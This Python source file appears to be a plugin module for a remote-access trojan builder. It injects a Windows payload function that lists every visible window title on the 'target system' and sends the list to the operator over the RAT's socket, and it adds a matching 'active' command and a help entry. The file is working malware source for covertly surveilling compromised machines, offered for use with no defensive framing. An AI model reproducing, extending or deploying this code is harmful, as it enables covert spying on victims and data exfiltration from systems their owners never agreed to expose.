# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('import ctypes')
        self.config.functions.append('''
def active():
    global IsWindowVisible
    EnumWindows = ctypes.windll.user32.EnumWindows
    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
    GetWindowText = ctypes.windll.user32.GetWindowTextW
    GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
    IsWindowVisible = ctypes.windll.user32.IsWindowVisible
    titles = []
    def foreach_window(hwnd, lParam):
        if IsWindowVisible(hwnd):
            length = GetWindowTextLength(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            GetWindowText(hwnd, buff, length + 1)
            titles.append(buff.value)
        return True
    EnumWindows(EnumWindowsProc(foreach_window), 0)    
    encoded = ['\\n   - ' + i.encode('ascii','ignore').decode().strip() for i in titles]
    encoded = filter(lambda a: a != '\\n   - ', encoded)
    encoded = list(set(encoded))
    data = '[+]All opened windows : \\n'
    data += ''.join(encoded)
    send_all(s,data + '\\n')''')
        self.config.logics.append('''
            elif command == "active":
                active()''')
        self.config.help_menu['active'] = 'Shows all open windows on the target system'
    elif option == 'info':
        self.log.blank('\nName             : Active Windows Dump component' \
                       '\nOS               : Windows' \
                       '\nRequired Modules : ctypes' \
                       '\nCommands         : active' \
                       '\nDescription      : Shows all open windows on the target system\n')
        return {
            "Name": "Active Windows Dump component",
            "OS": "Windows",
            "Required Modules": "ctypes",
            "Commands": "active",
            "Description": "Shows all open windows on the target system"}